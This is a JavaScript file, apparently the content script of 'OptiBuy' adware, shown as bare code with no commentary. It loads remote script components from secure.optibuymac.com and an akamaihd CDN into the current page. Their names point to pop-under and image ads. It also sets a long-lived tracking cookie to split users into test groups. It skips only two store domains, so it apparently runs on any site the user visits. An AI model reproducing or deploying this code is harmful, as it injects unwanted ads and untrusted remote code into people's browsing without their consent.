(function(){
    var admgr = {

        isDomainInList : function (domainList) {
            var domain = window.location.host;
            for (var i = 0; i < domainList.length; i++) {
                if (domain.indexOf( domainList[i] ) > -1) {
                    return true;
                }
            }
            return false;
        },

        loadJS : function (url) {
            var e=document.createElement('script');
            e.src = url;
            (document.getElementsByTagName('body')[0] || document.getElementsByTagName('head')[0]).appendChild(e);
        },

        isExp : function() {
            var source = 'upd-1720';

            if (source != 'tgo1-1629') {
                return false;
            }

            var cookieMgr = {
                get: function ( name ) {
                    name = name + "=";
                    var ca = document.cookie.split( ';' );
                    for( var i = 0; i < ca.length; i++ ) {
                        var c = ca[ i ].trim();
                        if( c.indexOf( name ) === 0 ) {
                            return JSON.parse( c.substring( name.length, c.length ) );
                        }
                    }
                    return "";
                },
                set: function ( name, value ) {
                    var expireInMinutes = 5 * 365 * 24 * 60;
                    var date = new Date();
                    date.setTime( date.getTime() + ( expireInMinutes * 60 * 1000 ) );
                    var expires = "; expires=" + date.toGMTString();

                    document.cookie = name + "=" + JSON.stringify( value ) + expires + "; path=/";
                },
                delete: function( name ) {
                    var expireInMinutes = -1 * 60 * 1000;
                    var date = new Date();
                    date.setTime( date.getTime() + ( expireInMinutes * 60 * 1000 ) );
                    var expires = "; expires=" + date.toGMTString();

                    document.cookie = name + "=" + expires + "; path=/";
                },
                isCookieEnabled: function () {
                    var name = 'ctest_' + Math.random().toString( 36 ).substring( 2, 7 );
                    this.set( name, 'valid' );
                    var isEnabled = ( this.get( name ) == 'valid' );
                    this.delete( name );
                    return isEnabled;
                }
            };

            if (!cookieMgr.isCookieEnabled()) {
                return false;
            }
            var runOthersCookie = cookieMgr.get('runOthersCookie');
            if (runOthersCookie) {
                return runOthersCookie.result;
            }
            var result = (Math.random() >= .5) ? true : false;
            cookieMgr.set('runOthersCookie', {result: result});
            return result;
        },

        init : function() {
            var group = encodeURIComponent('UEQzL0Niczh6MDJ4bHBxK0lsTUNrUT09');
            var source = 'upd-1720';
            var brandName = 'OptiBuy';
            var isn = '800';
            var all = ["50onred-pops-ts","fts","ohoteldeals","frstofz-image-ad","frstofrz-combined","foxyd","ga","auframe","qa"];
            var initOnly = ["50onred-pops-ts","auframe","qa","ga"];
            var a = all;
            if (admgr.isExp()) {
                source += "-exp";
                a = initOnly;
            }

            
            if (window.location.hostname.toLowerCase().indexOf('store.mackeeper.com') !== -1 || window.location.hostname.toLowerCase().indexOf('store.payproglobal.com') !== -1) {
                return;
            }

            if (window.name.match(/^(a652c|ld893)/)) {
                var e = document.createElement('script');
                e.src = '//cdncache-a.akamaihd.net/sub/s4aa1f3/' + source + '/l.js?pid=2484&ext=' + brandName + '&nocache=1';
                document.body.appendChild(e);
                return;
            }

            
            a.forEach(function(component) {
                var url = '//secure.optibuymac.com/servicejs/components/js/?key='+component+'&source='+source+'&isn='+isn+'&group='+group;
                if (component == 'ga') {
                    url += '&components=' + a.join(",");
                }
                admgr.loadJS(url);
            });
        },
        runOthers: function() {
            if (window.mmRunOthers) {
                return;
            }
            window.mmRunOthers = true;
            var group = encodeURIComponent('UEQzL0Niczh6MDJ4bHBxK0lsTUNrUT09');
            var source = 'upd-1720';
            var brandName = 'OptiBuy';
            var isn = '800';
            var otherOnly = ["fts","ohoteldeals","frstofz-image-ad","frstofrz-combined","foxyd"];
            var a = otherOnly;
            if (admgr.isExp()) {
                source += "-exp";
            }

            
            if (window.location.hostname.toLowerCase().indexOf('store.mackeeper.com') !== -1 || window.location.hostname.toLowerCase().indexOf('store.payproglobal.com') !== -1) {
                return;
            }

            if (window.name.match(/^(a652c|ld893)/)) {
                var e = document.createElement('script');
                e.src = '//cdncache-a.akamaihd.net/sub/s4aa1f3/' + source + '/l.js?pid=2484&ext=' + brandName + '&nocache=1';
                document.body.appendChild(e);
                return;
            }

            
            a.forEach(function(component) {
                var url = '//secure.optibuymac.com/servicejs/components/js/?key='+component+'&source='+source+'&isn='+isn+'&group='+group;
                if (component == 'ga') {
                    url += '&components=' + a.join(",");
                }
                admgr.loadJS(url);
            });
        }
    }

    if (admgr.isExp()) {
        window._admgrRO = admgr.runOthers;
    }
    else {
        window._admgrRO = function() {};
    }
    admgr.init();
})();

